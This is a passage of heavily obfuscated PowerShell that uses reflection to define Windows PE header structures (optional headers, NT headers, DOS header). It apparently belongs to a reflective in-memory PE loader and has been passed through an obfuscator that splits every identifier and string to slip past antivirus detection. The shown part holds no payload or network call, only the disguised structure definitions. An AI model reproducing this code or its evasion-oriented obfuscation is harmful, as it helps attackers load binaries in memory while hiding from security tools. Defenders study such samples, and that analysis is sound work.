		(${TyPE`B`UilD`Er}.('D'+'ef'+'ineF'+'ield').Invoke(('I'+("{2}{0}{1}" -f'rtT','a','mpo')+'ble'), ${i`MAGE_D`A`Ta`_`DIr`ecToRY}, ('Pub'+'lic'))).('SetO'+'ffs'+'et').Invoke(120) | &("{1}{0}" -f'ut-Null','O')
		(${t`yP`Ebu`ildEr}.('Defin'+'e'+'F'+'ield').Invoke(('Res'+'ou'+("{0}{1}" -f'rce','T')+'a'+'ble'), ${iMA`g`e_DA`TA`_dIr`ecTOry}, (("{1}{0}" -f'l','Pub')+'ic'))).('SetOf'+'fs'+'et').Invoke(128) | &("{1}{0}" -f 'l','Out-Nul')
		(${T`yPEB`Uil`deR}.('Def'+'ineFi'+'eld').Invoke((("{3}{0}{2}{1}"-f 'cept','n','io','Ex')+'Tab'+'l'+'e'), ${IMAgE_dATa`_`diRE`CToRy}, ('Pub'+'lic'))).('S'+'etOffs'+'et').Invoke(136) | &("{0}{1}"-f'Out','-Null')
		(${ty`PEbUI`L`der}.('DefineFie'+'l'+'d').Invoke(('Ce'+'rt'+("{0}{3}{2}{1}"-f 'i','able','cateT','fi')), ${IMaGe_D`ATa`_di`R`eC`T`ORy}, (("{0}{1}" -f 'Pu','bli')+'c'))).('SetOf'+'fs'+'et').Invoke(144) | &("{2}{0}{1}"-f'ut-Nu','ll','O')
		(${t`Y`PE`BUILDEr}.('D'+'ef'+'in'+'eField').Invoke(('Ba'+("{1}{0}"-f'lo','seRe')+("{2}{1}{0}" -f 'a','onT','cati')+'b'+'l'+'e'), ${ima`g`E_DAta_`d`iR`eCtory}, (("{0}{1}"-f'Publ','i')+'c'))).('Set'+'Offs'+'et').Invoke(152) | &("{0}{1}" -f'Out-Nu','ll')
		(${TYPEBUI`l`D`Er}.('D'+'efi'+'neField').Invoke(('D'+("{1}{0}" -f 'bug','e')), ${i`MaGe_D`ATA_d`i`REC`TOrY}, (("{1}{0}" -f'ubli','P')+'c'))).('SetO'+'ffs'+'et').Invoke(160) | &("{2}{1}{0}" -f 'Null','t-','Ou')
		(${TypEb`UI`ld`er}.('Defi'+'n'+'eField').Invoke(('Ar'+'ch'+'it'+("{0}{1}" -f'ect','ure')), ${ima`ge_Da`Ta_D`IREct`O`Ry}, (("{1}{0}" -f 'ubli','P')+'c'))).('S'+'etOff'+'se'+'t').Invoke(168) | &("{2}{0}{1}"-f 'ut','-Null','O')
		(${tYPEB`U`i`LDEr}.('Def'+'ineF'+'ield').Invoke(('Glo'+'ba'+("{1}{0}" -f'Ptr','l')), ${i`magE_da`Ta_DI`ReC`ToRy}, ('Pu'+("{0}{1}"-f'bli','c')))).('SetO'+'ffs'+'et').Invoke(176) | &("{1}{0}{2}"-f 'u','O','t-Null')
		(${TYpEBuI`LD`ER}.('D'+'efine'+'Field').Invoke((("{0}{1}" -f'TL','STa')+'bl'+'e'), ${i`m`A`gE_d`ATa_dIreCT`oRy}, ('P'+("{0}{1}" -f'ubli','c')))).('SetO'+'ff'+'set').Invoke(184) | &("{2}{1}{0}" -f'l','l','Out-Nu')
		(${TypeB`U`iLd`eR}.('D'+'efi'+'ne'+'Field').Invoke(('Loa'+'d'+("{1}{0}"-f'ab','ConfigT')+'l'+'e'), ${im`AGe_`d`AtA_DIRE`CToRy}, (("{1}{0}" -f 'l','Pub')+'ic'))).('Set'+'O'+'ffset').Invoke(192) | &("{1}{0}" -f 'll','Out-Nu')
		(${typeb`Ui`LDER}.('Define'+'F'+'ield').Invoke((("{0}{1}" -f 'Bo','un')+'dI'+'m'+("{1}{0}" -f't','por')), ${Ima`G`E_DAta_`dIrECt`ORy}, (("{0}{1}"-f'P','ubl')+'ic'))).('Se'+'tOffset').Invoke(200) | &("{0}{1}{2}" -f'Out-N','u','ll')
		(${t`ype`BUILdEr}.('DefineF'+'i'+'eld').Invoke(('IA'+'T'), ${i`MaGE_Da`TA_dIRe`C`TorY}, ('P'+("{1}{0}" -f 'bli','u')+'c'))).('Se'+'tO'+'ffse'+'t').Invoke(208) | &("{0}{1}"-f'O','ut-Null')
		(${T`yPEbUil`D`er}.('De'+'f'+'ineFie'+'ld').Invoke(('D'+'e'+("{1}{0}{2}" -f'Impor','lay','t')+("{0}{1}{2}"-f'Descr','i','p')+'tor'), ${ImAGE`_Da`T`A`_`dIrECtORy}, (("{0}{1}" -f'Pu','bl')+'ic'))).('Se'+'t'+'Offse'+'t').Invoke(216) | &("{0}{1}" -f'Out-Nu','ll')
		(${T`Y`pEBUILd`eR}.('Define'+'F'+'ield').Invoke((("{0}{1}"-f'CL','RR')+'u'+("{0}{1}"-f 'nti','m')+("{1}{0}{2}" -f'He','e','ader')), ${i`MaGe_datA_`dirE`Cto`RY}, (("{1}{0}"-f'bl','Pu')+'i'+'c'))).('SetOff'+'set').Invoke(224) | &("{2}{1}{0}" -f'ull','t-N','Ou')
		(${tyP`E`BuILd`er}.('Def'+'in'+'eFiel'+'d').Invoke(('Re'+("{1}{0}"-f'rve','se')+'d'), ${imag`E_dA`T`A_dIRectO`Ry}, ('Pu'+("{1}{0}" -f'c','bli')))).('S'+'e'+'tOffset').Invoke(232) | &("{0}{1}"-f 'Out-','Null')
		${Ima`GE_OPtio`Nal`_`HEa`DE`R64} = ${TYpE`B`U`ildeR}.('CreateTy'+'p'+'e').Invoke()
		${WIn`32`TY`pes} | &("{2}{0}{1}"-f '-Memb','er','Add') -MemberType ('Not'+'eProp'+'e'+'rty') -Name ('IMA'+'GE_OPTI'+'ONAL_'+'H'+'EA'+'DER64') -Value ${imaGE_OpTI`onA`l`_`Head`Er64}

		
		${at`TRIbuT`es} = (("{0}{1}" -f 'A','utoL')+'a'+'you'+("{1}{0}"-f', A','t')+'ns'+'i'+("{2}{0}{4}{1}{3}"-f 'ass, ','lass,','Cl',' Public','C')+','+' Ex'+'pli'+'cit'+'La'+'yo'+("{1}{0}"-f ', ','ut')+'Sea'+'l'+'ed,'+("{1}{0}" -f'ef',' B')+'o'+'re'+("{0}{2}{1}" -f 'Fie','it','ldIn'))
		${TYp`EbUilD`er} = ${mOdule`B`U`ildER}.('D'+'efin'+'e'+'Type').Invoke((("{1}{0}"-f'E_','IMAG')+'OP'+'TIO'+("{1}{0}"-f 'E','NAL_H')+'A'+'DE'+'R32'), ${aT`TRIb`UtES}, [System.ValueType], 224)
		(${typ`eB`UiL`deR}.('Defi'+'neFi'+'eld').Invoke((("{0}{1}" -f'Ma','gi')+'c'), ${Ma`GICT`YPE}, ('Pub'+'l'+'ic'))).('SetO'+'ff'+'set').Invoke(0) | &("{0}{1}{2}" -f 'Out','-Nul','l')
		(${TyPE`Bu`ild`ER}.('Defin'+'eFi'+'eld').Invoke((("{0}{1}"-f 'M','ajor')+'L'+("{1}{0}" -f 'ke','in')+'r'+("{1}{0}"-f 'n','Versio')), [Byte], (("{1}{0}" -f 'ubli','P')+'c'))).('S'+'et'+'Offse'+'t').Invoke(2) | &("{1}{0}{2}"-f't-N','Ou','ull')
		(${tyPe`BuIL`dEr}.('Define'+'Fi'+'eld').Invoke(('Min'+'or'+("{0}{1}"-f 'Li','nke')+'rVe'+("{1}{0}" -f 'on','rsi')), [Byte], ('P'+'u'+("{1}{0}"-f'lic','b')))).('SetOff'+'s'+'et').Invoke(3) | &("{1}{2}{0}"-f'll','Ou','t-Nu')
		(${TYpeBUi`LD`eR}.('D'+'efin'+'eFi'+'eld').Invoke(('S'+("{1}{0}" -f 'eOfC','iz')+'ode'), [UInt32], ('P'+("{0}{1}"-f 'ubli','c')))).('Se'+'tOf'+'fse'+'t').Invoke(4) | &("{1}{2}{0}" -f '-Null','O','ut')
		(${tYPEBUi`Ld`ER}.('D'+'efine'+'Fi'+'eld').Invoke((("{2}{0}{1}"-f 'izeO','fI','S')+("{1}{0}"-f'i','nit')+'ali'+("{0}{1}" -f 'zed','Da')+'t'+'a'), [UInt32], ('P'+("{1}{0}" -f 'bli','u')+'c'))).('Set'+'Offset').Invoke(8) | &("{1}{0}{2}" -f 'ut','O','-Null')
		(${TYp`eBU`IL`Der}.('D'+'efi'+'neFiel'+'d').Invoke(('Si'+("{0}{1}"-f'ze','OfUn')+'i'+'ni'+'tia'+("{2}{0}{1}"-f'ized','Dat','l')+'a'), [UInt32], ('P'+'ub'+'lic'))).('SetOf'+'f'+'set').Invoke(12) | &("{2}{1}{0}"-f 'l','-Nul','Out')
		(${TyP`EB`UILD`er}.('De'+'f'+'ineField').Invoke(('Add'+'re'+'s'+("{2}{1}{0}" -f 'EntryP','Of','s')+'oi'+'nt'), [UInt32], ('Pu'+'bl'+'ic'))).('SetOffs'+'e'+'t').Invoke(16) | &("{1}{2}{0}" -f 'ull','Out','-N')
		(${t`Y`Peb`UiLDer}.('D'+'ef'+'ineField').Invoke(('B'+("{0}{1}"-f 'aseO','fC')+'ode'), [UInt32], ('P'+("{1}{0}"-f 'bli','u')+'c'))).('Se'+'tO'+'ff'+'set').Invoke(20) | &("{1}{2}{0}"-f't-Null','O','u')
		(${t`ypEbU`IlDer}.('Define'+'F'+'i'+'eld').Invoke(('Bas'+("{1}{0}" -f 'fDa','eO')+'t'+'a'), [UInt32], ('P'+("{0}{1}"-f 'ubl','ic')))).('SetOff'+'s'+'e'+'t').Invoke(24) | &("{1}{0}"-f'l','Out-Nul')
		(${T`YpebU`i`LDeR}.('Def'+'i'+'neFie'+'ld').Invoke((("{1}{2}{0}" -f'eBa','Im','ag')+'s'+'e'), [UInt32], ('Pub'+'lic'))).('SetOffs'+'e'+'t').Invoke(28) | &("{0}{1}" -f'O','ut-Null')
		(${tyPeb`U`Ilder}.('D'+'efine'+'Field').Invoke((("{1}{0}"-f 'i','Sect')+'o'+'nAl'+("{0}{1}"-f 'ignme','nt')), [UInt32], ('P'+'ubl'+'ic'))).('S'+'et'+'Offset').Invoke(32) | &("{0}{2}{1}"-f 'Out','ll','-Nu')
		(${TY`PeB`UILDEr}.('D'+'e'+'fineF'+'ield').Invoke((("{0}{1}"-f'Fil','e')+'Ali'+'gn'+'me'+'nt'), [UInt32], (("{1}{0}"-f'bl','Pu')+'ic'))).('Se'+'tOffs'+'et').Invoke(36) | &("{2}{0}{1}" -f'u','ll','Out-N')
		(${typEB`UIL`d`er}.('Defin'+'e'+'Field').Invoke((("{0}{1}" -f'Majo','rO')+("{2}{1}{0}"-f'ati','er','p')+'n'+("{1}{2}{0}"-f 'e','gSy','st')+'mV'+'e'+'r'+'sio'+'n'), [UInt16], ('Pub'+'lic'))).('Se'+'tO'+'ffse'+'t').Invoke(40) | &("{2}{1}{0}" -f'll','-Nu','Out')
		(${tY`PeB`U`ILDEr}.('Defi'+'ne'+'Fie'+'ld').Invoke((("{1}{0}" -f'o','Min')+'rO'+'pe'+("{1}{0}{2}"-f'atingS','r','y')+("{2}{0}{1}" -f 'temVer','s','s')+'io'+'n'), [UInt16], ('Pub'+'lic'))).('SetOffs'+'et').Invoke(42) | &("{2}{1}{0}"-f 'll','-Nu','Out')
		(${T`yPeBui`lder}.('Def'+'i'+'neField').Invoke(('Ma'+("{1}{0}"-f'a','jorIm')+("{0}{1}" -f'ge','Ve')+("{0}{1}"-f'rsio','n')), [UInt16], (("{1}{0}"-f'ubli','P')+'c'))).('SetOf'+'fs'+'et').Invoke(44) | &("{1}{0}" -f 'ut-Null','O')
		(${T`yP`eBUiLd`er}.('D'+'ef'+'ineFie'+'ld').Invoke((("{1}{0}{2}"-f 'o','Min','rIma')+'ge'+'V'+("{1}{2}{0}" -f 'ion','e','rs')), [UInt16], ('Pub'+'li'+'c'))).('S'+'etOff'+'set').Invoke(46) | &("{2}{1}{0}" -f 't-Null','u','O')
		(${T`yPebu`ILD`er}.('Defin'+'e'+'Fie'+'ld').Invoke(('M'+("{1}{0}{2}" -f'o','aj','rSu')+("{0}{1}" -f'bs','yste')+'mV'+'er'+("{1}{0}"-f 'n','sio')), [UInt16], ('P'+("{1}{0}"-f 'blic','u')))).('S'+'etOffs'+'e'+'t').Invoke(48) | &("{0}{1}" -f 'Out-N','ull')
		(${TYp`e`BuIl`dER}.('Def'+'i'+'neFi'+'eld').Invoke(('Min'+'o'+'rS'+("{0}{1}{2}"-f 'ubs','ystemVers','i')+'on'), [UInt16], ('Pu'+("{0}{1}" -f'b','lic')))).('SetOf'+'fs'+'e'+'t').Invoke(50) | &("{0}{1}{2}" -f 'O','ut-Nu','ll')
		(${TYpe`B`U`iLDer}.('Def'+'ineF'+'ield').Invoke(('Wi'+("{0}{1}{2}" -f'n','3','2Versio')+'n'+'V'+("{1}{0}"-f 'ue','al')), [UInt32], ('Pub'+'lic'))).('SetOff'+'s'+'et').Invoke(52) | &("{0}{2}{1}"-f 'Ou','Null','t-')
		(${t`ypEBUil`DeR}.('D'+'e'+'fine'+'Field').Invoke(('Siz'+("{0}{1}" -f 'eOfI','ma')+'ge'), [UInt32], ('Pu'+("{1}{0}"-f'c','bli')))).('S'+'etOffset').Invoke(56) | &("{0}{1}{2}"-f'O','ut-Nu','ll')
		(${ty`peB`UIldEr}.('D'+'efi'+'n'+'eField').Invoke(('Si'+("{1}{0}{2}"-f'e','zeOfHead','r')+'s'), [UInt32], ('P'+("{1}{0}" -f'blic','u')))).('S'+'etO'+'ffset').Invoke(60) | &("{0}{1}"-f'Out-Nu','ll')
		(${t`yPeBUI`l`DEr}.('D'+'e'+'fineF'+'ield').Invoke((("{2}{1}{0}"-f 'kS','ec','Ch')+'u'+'m'), [UInt32], (("{0}{1}"-f'Pu','bl')+'ic'))).('S'+'etO'+'ffset').Invoke(64) | &("{1}{0}{2}" -f 'ul','Out-N','l')
		(${t`Y`pEb`UILDeR}.('D'+'ef'+'ineF'+'ield').Invoke((("{0}{1}" -f 'Su','bs')+'y'+("{0}{1}"-f 'st','em')), ${SuBs`YStE`Mt`yPe}, ('P'+("{0}{1}"-f 'ub','li')+'c'))).('S'+'etOf'+'fset').Invoke(68) | &("{2}{1}{0}" -f 'l','Nul','Out-')
		(${typEB`UiLd`ER}.('Defi'+'neFie'+'ld').Invoke((("{2}{0}{1}"-f 'C','har','Dll')+'a'+'c'+("{0}{1}"-f 'te','rist')+'ics'), ${DlL`cHaRAcTeRISTI`Cs`Ty`Pe}, ('Pu'+'b'+'lic'))).('Se'+'tOff'+'set').Invoke(70) | &("{1}{2}{0}" -f'll','Out','-Nu')
		(${ty`pebU`I`lDeR}.('D'+'e'+'fin'+'eField').Invoke((("{2}{1}{0}"-f 'St','eOf','Siz')+("{0}{1}" -f 'ac','kR')+'e'+("{1}{0}" -f 've','ser')), [UInt32], ('P'+("{1}{0}"-f'c','ubli')))).('S'+'etOffse'+'t').Invoke(72) | &("{0}{1}"-f 'Ou','t-Null')
		(${TY`pEBUild`ER}.('Def'+'ineF'+'ield').Invoke(('S'+("{1}{0}"-f'zeOf','i')+'Sta'+("{0}{1}{2}"-f 'c','k','Commit')), [UInt32], (("{1}{0}"-f 'bl','Pu')+'ic'))).('S'+'etOffset').Invoke(76) | &("{1}{0}{2}" -f'u','Out-N','ll')
		(${Ty`PeBUIl`dEr}.('De'+'fine'+'Field').Invoke(('S'+("{0}{1}"-f 'i','zeO')+("{0}{1}"-f'fHe','a')+("{0}{1}" -f'pRe','se')+'rv'+'e'), [UInt32], ('P'+("{0}{1}"-f 'ubli','c')))).('Se'+'tOf'+'f'+'set').Invoke(80) | &("{2}{1}{0}"-f'Null','ut-','O')
		(${ty`P`EbUIlder}.('Def'+'ineF'+'ie'+'ld').Invoke((("{1}{0}"-f 'O','Size')+'f'+'H'+("{0}{1}"-f 'eapCom','m')+'it'), [UInt32], ('P'+("{0}{1}" -f 'ubl','ic')))).('SetOffse'+'t').Invoke(84) | &("{1}{0}{2}" -f 'ut-Nul','O','l')
		(${t`ypEBu`i`LDER}.('De'+'fineF'+'ield').Invoke(('Lo'+("{1}{0}" -f'der','a')+("{0}{1}"-f 'Flag','s')), [UInt32], ('P'+'ub'+'lic'))).('S'+'etOff'+'set').Invoke(88) | &("{1}{0}" -f '-Null','Out')
		(${TypE`Bu`ILd`eR}.('D'+'efineFi'+'eld').Invoke((("{0}{1}"-f 'Num','be')+'r'+'O'+'f'+'Rv'+("{2}{0}{1}"-f'd','Sizes','aAn')), [UInt32], (("{0}{1}" -f'Pu','bl')+'ic'))).('S'+'et'+'Off'+'set').Invoke(92) | &("{2}{0}{1}" -f'-N','ull','Out')
		(${t`YpEbui`LDEr}.('DefineF'+'i'+'el'+'d').Invoke(('E'+'xp'+("{1}{0}"-f'T','ort')+("{0}{1}" -f 'ab','le')), ${IM`AGe_dA`Ta`_DIR`ec`ToRY}, ('P'+'ub'+'lic'))).('Set'+'Of'+'fset').Invoke(96) | &("{1}{0}{2}" -f 'N','Out-','ull')
		(${TY`pE`BuilDEr}.('Def'+'in'+'eFiel'+'d').Invoke(('Imp'+("{2}{1}{0}" -f'tTab','r','o')+'le'), ${iMagE_`Dat`A_DiRe`cT`O`Ry}, ('P'+'u'+("{0}{1}" -f 'b','lic')))).('SetOffs'+'et').Invoke(104) | &("{0}{1}" -f'O','ut-Null')
		(${TYp`ebuIlD`eR}.('D'+'efi'+'neField').Invoke(('Res'+'ou'+'r'+("{0}{2}{1}" -f 'ceTa','le','b')), ${IM`A`g`e_`DatA_dIREctoRY}, (("{0}{1}"-f 'P','ubl')+'ic'))).('Se'+'tOffs'+'et').Invoke(112) | &("{2}{1}{0}" -f 'l','-Nul','Out')
		(${tY`Pebu`i`LDER}.('D'+'efineFiel'+'d').Invoke((("{1}{0}"-f'xcep','E')+("{0}{1}"-f't','ion')+'Ta'+'ble'), ${iMAgE_DATa`_diR`Ec`TorY}, (("{1}{0}" -f 'bl','Pu')+'ic'))).('S'+'e'+'tOffset').Invoke(120) | &("{0}{2}{1}"-f 'Out-','ull','N')
		(${Typ`EBUIl`DEr}.('D'+'efineFi'+'eld').Invoke((("{1}{0}"-f'if','Cert')+'ica'+("{1}{2}{0}" -f'l','te','Tab')+'e'), ${Im`Age`_Data`_`DIrEctOrY}, ('Pub'+'lic'))).('Se'+'tO'+'f'+'fset').Invoke(128) | &("{0}{1}"-f'Out-Nul','l')
		(${TyPeb`Ui`LDer}.('Def'+'ine'+'Fie'+'ld').Invoke(('B'+("{0}{1}"-f'aseRelo','c')+'a'+'ti'+'o'+("{0}{1}"-f'nTa','ble')), ${ImaGE_D`At`A_DiRE`ctoRY}, (("{1}{0}"-f 'i','Publ')+'c'))).('SetOf'+'fs'+'et').Invoke(136) | &("{1}{0}{2}" -f't-Nul','Ou','l')
		(${Ty`pEbUIL`d`ER}.('D'+'efineF'+'iel'+'d').Invoke(('D'+("{0}{1}"-f'ebu','g')), ${i`M`AgE_daT`A`_diRECToRy}, ('P'+'ubl'+'ic'))).('Se'+'tOffs'+'et').Invoke(144) | &("{1}{2}{0}" -f'll','Out-','Nu')
		(${tyPE`B`UiL`dER}.('Def'+'ineFi'+'eld').Invoke((("{0}{1}"-f'Arch','it')+'ec'+("{0}{1}" -f'tu','re')), ${ImAG`E`_DA`T`A_dIreCTorY}, ('Pub'+'lic'))).('SetOf'+'fset').Invoke(152) | &("{0}{2}{1}" -f 'O','ll','ut-Nu')
		(${t`Yp`eBUiLder}.('De'+'fine'+'Field').Invoke((("{1}{0}"-f'obalP','Gl')+'tr'), ${i`mage_DAtA`_d`irEC`TorY}, ('P'+("{1}{0}" -f 'blic','u')))).('SetO'+'ffs'+'et').Invoke(160) | &("{2}{0}{1}"-f 'Nu','ll','Out-')
		(${tY`P`ebUILdER}.('D'+'e'+'fi'+'neField').Invoke((("{1}{0}" -f'T','TLS')+'abl'+'e'), ${i`M`AgE`_DA`Ta_diRECto`Ry}, (("{1}{0}" -f'ubli','P')+'c'))).('S'+'etO'+'ffset').Invoke(168) | &("{0}{1}{2}" -f'O','ut-Nu','ll')
		(${tYpE`BU`Il`der}.('Defi'+'neF'+'iel'+'d').Invoke(('Loa'+'d'+'C'+("{0}{2}{1}"-f 'o','bl','nfigTa')+'e'), ${imA`ge_`D`A`TA`_dIREct`oRY}, (("{1}{0}"-f'bli','Pu')+'c'))).('S'+'etOffs'+'et').Invoke(176) | &("{0}{1}{2}" -f 'Out-','Nu','ll')
		(${t`yP`eB`UIldEr}.('D'+'efin'+'eFiel'+'d').Invoke((("{1}{2}{0}"-f'Im','B','ound')+'por'+'t'), ${IM`Age`_`dAt`A_`DIREcTORY}, ('P'+("{1}{0}"-f 'i','ubl')+'c'))).('SetO'+'ffs'+'et').Invoke(184) | &("{2}{0}{1}" -f '-Nul','l','Out')
		(${TyPe`B`UIldER}.('Defi'+'neFie'+'ld').Invoke(('I'+'AT'), ${iMA`Ge_`datA_`DirecTO`RY}, ('P'+'ub'+'lic'))).('Set'+'Offs'+'et').Invoke(192) | &("{1}{0}{2}"-f 'ut-Nul','O','l')
		(${t`Y`PEbUI`LDER}.('Defi'+'neFiel'+'d').Invoke((("{1}{0}" -f 'la','De')+("{0}{1}" -f'yIm','po')+'r'+("{1}{0}"-f 's','tDe')+("{0}{1}{2}" -f 'c','r','iptor')), ${i`mAg`e_`D`ATa_`diRECtOry}, (("{0}{1}" -f'P','ubli')+'c'))).('SetOff'+'s'+'et').Invoke(200) | &("{0}{2}{1}" -f 'Out-N','ll','u')
		(${tyPEbu`i`l`deR}.('DefineF'+'ie'+'ld').Invoke(('C'+'LRR'+("{0}{1}" -f 'untim','e')+("{0}{1}"-f'Head','er')), ${ImAGE_D`A`Ta`_di`R`eCTOry}, ('Pub'+'li'+'c'))).('Set'+'Offs'+'e'+'t').Invoke(208) | &("{2}{0}{1}" -f 'u','t-Null','O')
		(${t`Ype`BuIl`dER}.('Def'+'ineF'+'iel'+'d').Invoke((("{0}{1}" -f'Re','ser')+'ve'+'d'), ${i`M`Ag`E_D`ATA_DiR`E`cTOry}, ('P'+'ub'+'lic'))).('SetO'+'f'+'fset').Invoke(216) | &("{2}{0}{1}"-f'ul','l','Out-N')
		${ImAgE_O`P`TiONaL_H`Ea`dEr`32} = ${t`YP`EBuIL`Der}.('C'+'reateTyp'+'e').Invoke()
		${w`i`N32TYpes} | &("{0}{2}{1}" -f'Ad','r','d-Membe') -MemberType ('NotePro'+'p'+'er'+'ty') -Name ('IM'+'A'+'GE_OPTI'+'O'+'NAL_HEADER32') -Value ${imaG`e_optiONA`L_`HEAde`R32}

		
		${A`TTr`ibutES} = ('Au'+("{0}{1}"-f 't','oLayo')+'ut,'+("{1}{0}" -f'Ans',' ')+("{1}{0}"-f'las','iC')+("{0}{1}"-f 's',', Cl')+'as'+'s'+','+' '+("{0}{1}"-f'P','ubl')+("{0}{1}"-f 'ic',', Seq')+'uen'+'t'+'ia'+("{0}{1}"-f'l','Layou')+'t, '+("{0}{1}"-f'Se','ale')+'d, '+("{0}{2}{1}"-f'Be','eFi','for')+'el'+'dI'+'ni'+'t')
		${T`ypE`BuiL`deR} = ${m`OdU`L`EBu`ilDer}.('Defin'+'eTy'+'p'+'e').Invoke((("{0}{1}"-f'IMAG','E')+'_'+'NT'+("{1}{0}"-f 'A','_HE')+("{1}{0}"-f '64','DERS')), ${aT`TribU`TES}, [System.ValueType], 264)
		${t`YPE`Build`Er}.('Defi'+'ne'+'Fiel'+'d').Invoke(('S'+("{2}{0}{1}" -f 'gna','tur','i')+'e'), [UInt32], ('P'+'ubl'+'ic')) | &("{2}{1}{0}" -f 'ull','N','Out-')
		${TYpe`Bu`I`LdeR}.('D'+'efineF'+'ield').Invoke(('F'+'i'+'le'+("{0}{1}"-f'Hea','der')), ${image_f`ILe`_HeA`deR}, ('Pu'+("{0}{1}"-f 'b','lic'))) | &("{2}{0}{1}"-f'Nul','l','Out-')
		${TY`PeB`UildEr}.('D'+'ef'+'ine'+'Field').Invoke(('Opt'+'i'+'on'+("{2}{1}{0}"-f'er','d','alHea')), ${Image_Opt`iONaL`_hEAD`e`R`64}, (("{0}{1}"-f'Pub','li')+'c')) | &("{1}{2}{0}" -f 'll','Out','-Nu')
		${IMAg`E`_nt_heA`Der`S`64} = ${t`yP`e`BUilDEr}.('CreateTy'+'p'+'e').Invoke()
		${win`32T`yp`ES} | &("{0}{2}{1}"-f'Ad','r','d-Membe') -MemberType ('N'+'ote'+'Pr'+'operty') -Name ('I'+'MAGE_NT'+'_HEA'+'DER'+'S6'+'4') -Value ${i`M`Age`_Nt_`HE`AdErs64}
		
		
		${atT`RI`BUTeS} = ('A'+'u'+("{0}{1}"-f'toL','ayo')+'u'+'t,'+' An'+("{2}{0}{1}" -f 'iClas','s','s')+','+("{0}{1}" -f ' Cl','a')+'ss'+', '+("{1}{0}"-f'c','Publi')+', '+'S'+("{1}{0}"-f 'quentia','e')+("{1}{0}"-f 'you','lLa')+'t'+', '+'Se'+("{1}{0}"-f'led','a')+("{0}{1}{2}" -f ', B','ef','o')+'reF'+("{2}{1}{0}" -f'nit','dI','iel'))
		${typE`B`UIlD`Er} = ${moD`U`Lebu`ildEr}.('Defi'+'neTy'+'p'+'e').Invoke((("{0}{2}{1}"-f 'I','_NT','MAGE')+'_HE'+'A'+'D'+("{0}{1}" -f 'ER','S3')+'2'), ${A`TtRiBU`T`Es}, [System.ValueType], 248)
		${TY`p`eBUi`LDeR}.('D'+'ef'+'ineFie'+'ld').Invoke((("{0}{1}"-f 'Signa','t')+'ure'), [UInt32], ('P'+("{0}{1}" -f'ubli','c'))) | &("{1}{0}" -f'Null','Out-')
		${typE`BuI`L`der}.('D'+'efine'+'Fi'+'eld').Invoke((("{1}{0}" -f 'eH','Fil')+'ead'+'er'), ${Im`AGE_f`i`LE`_HeAdEr}, (("{0}{1}" -f'Pu','bli')+'c')) | &("{2}{1}{0}"-f't-Null','u','O')
		${typ`E`BUil`DER}.('Defin'+'eF'+'ie'+'ld').Invoke(('O'+("{0}{3}{1}{2}" -f'p','ea','de','tionalH')+'r'), ${imaGE`_Op`TiO`NAL_H`E`AdEr`32}, ('Pu'+("{1}{0}" -f 'lic','b'))) | &("{0}{1}"-f'Out-Nu','ll')
		${Im`A`Ge_n`T_heaD`erS32} = ${t`Yp`E`BuIldeR}.('Crea'+'teT'+'ype').Invoke()
		${w`in`32TypEs} | &("{1}{2}{0}"-f'ember','Add-','M') -MemberType ('NoteP'+'ro'+'pert'+'y') -Name ('IM'+'A'+'GE_'+'NT_HE'+'A'+'DERS32') -Value ${IM`AGe_`NT_H`eaDErS32}

		
		${A`Tt`RI`BUTES} = (("{1}{0}" -f 'utoL','A')+("{2}{1}{0}"-f 'Ans','yout, ','a')+("{0}{1}{2}" -f 'iCl','a','ss, ')+("{1}{2}{0}{3}"-f's, P','Cla','s','u')+("{0}{1}{2}"-f'b','l','ic, Se')+'que'+("{0}{1}{2}{3}" -f 'n','t','ialLa','yout,')+' S'+'e'+'a'+("{1}{3}{2}{0}" -f 'reF','led','fo',', Be')+'ie'+'ldI'+'nit')
		${T`y`pEb`UilDER} = ${moD`UlebU`IlDER}.('Define'+'Ty'+'p'+'e').Invoke(('IM'+("{1}{0}"-f 'D','AGE_')+'OS_'+("{1}{0}" -f'ADER','HE')), ${att`R`Ibutes}, [System.ValueType], 64)
		${TyPe`BUiLd`Er}.('D'+'ef'+'ineFi'+'eld').Invoke(('e'+'_'+("{0}{1}" -f 'm','agic')), [UInt16], ('Pu'+'bli'+'c')) | &("{2}{0}{1}" -f't-Nu','ll','Ou')
		${TYPeBU`i`ldER}.('D'+'efi'+'neField').Invoke(('e_'+("{1}{0}" -f 'p','cbl')), [UInt16], ('Pub'+'lic')) | &("{2}{1}{0}"-f 'ull','ut-N','O')
		${tY`PebUI`lDer}.('Defi'+'ne'+'Fie'+'ld').Invoke(('e'+'_cp'), [UInt16], (("{0}{1}"-f'Pub','l')+'i'+'c')) | &("{2}{1}{0}"-f't-Null','u','O')
		${tyPeB`UIL`DeR}.('Def'+'ine'+'Field').Invoke(('e'+("{1}{0}" -f'rlc','_c')), [UInt16], ('P'+'ubl'+'ic')) | &("{2}{0}{1}" -f't','-Null','Ou')
		${typ`EBuIL`deR}.('De'+'fine'+'Fi'+'eld').Invoke(('e_c'+'pa'+("{0}{1}" -f'r','hdr')), [UInt16], (("{0}{1}"-f'P','ubl')+'ic')) | &("{1}{2}{0}"-f'Null','Out','-')
		${Ty`pEBUi`l`der}.('De'+'fi'+'neFie'+'ld').Invoke(('e'+("{0}{2}{1}" -f'_m','nal','i')+'lo'+'c'), [UInt16], ('Pu'+("{1}{0}" -f'lic','b'))) | &("{1}{2}{0}" -f 'll','O','ut-Nu')
		${Ty`PEb`UILd`ER}.('Defi'+'ne'+'F'+'ield').Invoke(('e_'+'ma'+("{0}{1}"-f 'xa','llo')+'c'), [UInt16], ('Pub'+'li'+'c')) | &("{1}{0}"-f 'll','Out-Nu')
		${tYp`E`BuIl`dER}.('Defi'+'n'+'eField').Invoke(('e'+'_ss'), [UInt16], ('P'+("{0}{1}" -f 'u','blic'))) | &("{1}{0}"-f'll','Out-Nu')
		${typEb`UI`ldER}.('Defin'+'e'+'Field').Invoke(('e_'+'sp'), [UInt16], (("{1}{0}"-f 'ubli','P')+'c')) | &("{1}{0}{2}" -f 't-Nu','Ou','ll')
		${T`Y`pe`BuilDEr}.('De'+'fineFie'+'ld').Invoke(('e_'+("{0}{1}"-f'csu','m')), [UInt16], ('Pu'+("{0}{1}"-f'b','lic'))) | &("{0}{1}{2}" -f'Ou','t-N','ull')
		${TYp`EbuiL`DER}.('De'+'fi'+'neF'+'ield').Invoke(('e'+'_ip'), [UInt16], ('Pub'+'lic')) | &("{1}{2}{0}" -f'Null','O','ut-')
		${tyPeb`UIld`Er}.('Defin'+'eF'+'ield').Invoke(('e_'+'cs'), [UInt16], (("{1}{0}"-f 'li','Pub')+'c')) | &("{1}{2}{0}" -f'ull','Out-','N')
